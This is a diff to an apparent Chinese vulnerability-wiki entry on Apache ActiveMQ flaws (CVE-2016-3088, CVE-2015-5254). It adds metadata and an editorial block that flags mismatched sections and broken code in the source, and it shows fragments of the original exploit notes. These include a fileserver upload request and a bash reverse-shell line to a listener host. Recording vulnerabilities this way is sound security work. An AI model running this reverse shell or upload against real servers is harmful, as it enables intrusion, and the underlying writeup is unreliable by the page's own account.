@@ -1,8 +1,56 @@
 ---
-cve: "CVE-2016-3088"
+cve: "CVE-2016-3088; CVE-2015-5254"
+title: "ActiveMQ 漏洞总结"
+product: "Apache ActiveMQ Fileserver/管理端/JMS"
+record_type: "roundup"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "quarantined"
+identifier_status: "active"
+primary_identifiers: "CVE-2016-3088; CVE-2015-5254"
+referenced_identifiers: ""
+identifier_role: "primary"
+prerequisites: "Fileserver启用；JSP访问需管理员；JMS能发消息且消费/管理员查看触发反序列化；OS写账号须已有root"
+source_url: "https://mp.weixin.qq.com/s/edJ1ZDLzHaNLX6RpuregPQ"
+source_status: "recorded"
+side_effects: "含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。; 含落盘脚本或账户创建：会留下持久状态。记录本次生成的路径或账户，测试后清理这些对象并撤销关联令牌；不要删除既有业务对象。"
+id: "vw-a66874f858d5aaba4bd7c250"
+entity_id: "ve-a66874f858d5aaba4bd7c250"
+schema_version: "1"
 ---
 
 # ActiveMQ 漏洞总结
+
+<!-- vulwiki-editorial:start -->
+## 校订与适用边界
+
+- 适用前提：Fileserver启用；JSP访问需管理员；JMS能发消息且消费/管理员查看触发反序列化；OS写账号须已有root
+- 证据范围：大量节标题与下方内容错配，不能按现有章节生成标准实体；后半保留反弹/移动失败与权限限制有价值
+
+### 本次正文校订
+
+- 按实际内容修正 2 处代码围栏语言标记，保留其中方法与请求内容。
+
+### 尚未解决的证据缺口
+
+以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：
+
+- 弱口令小节实际XSS载荷，源码泄露实际MOVE写文件，XSS小节实际JMS浏览URL
+- 默认端口8363与前文8161矛盾
+- status_code整数与字符串204比较永远失败；JSP out.print缺分号
+- PUT的Python脚本介绍下面却插入创建root账号shell，明显混贴
+- 5.x~5.14范围不准确；元数据漏5254
+- 修改passwd为UID0需要已有root，不能叫由普通权限提权；未授权示例带session需对照
+
+### 操作风险与资料使用
+
+- 含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。
+- 含落盘脚本或账户创建：会留下持久状态。记录本次生成的路径或账户，测试后清理这些对象并撤销关联令牌；不要删除既有业务对象。
+
+本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
+<!-- vulwiki-editorial:end -->
+
+## 技术正文与历史材料
 
 <meta name="referrer" content="no-referrer"/>
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/edJ1ZDLzHaNLX6RpuregPQ)
@@ -53,7 +101,7 @@ Jetty 是一个开源的 servlet 容器，它为基于 Java 的 web 容器，例
 
 ### 未授权访问
 
-```
+```python
 import requests
 url = "http://192.168.0.11:8161/fileserver/shell2.txt"
 headers = {
@@ -199,7 +247,7 @@ http://192.168.0.11:8161/admin/browse.jsp?JMSDestination=event
 
 不仅如此我们还可以修改命令，反弹 shell
 
-```
+```shell
 bash -i >& /dev/tcp/192.168.31.41/8080 0>&1
 ```
 
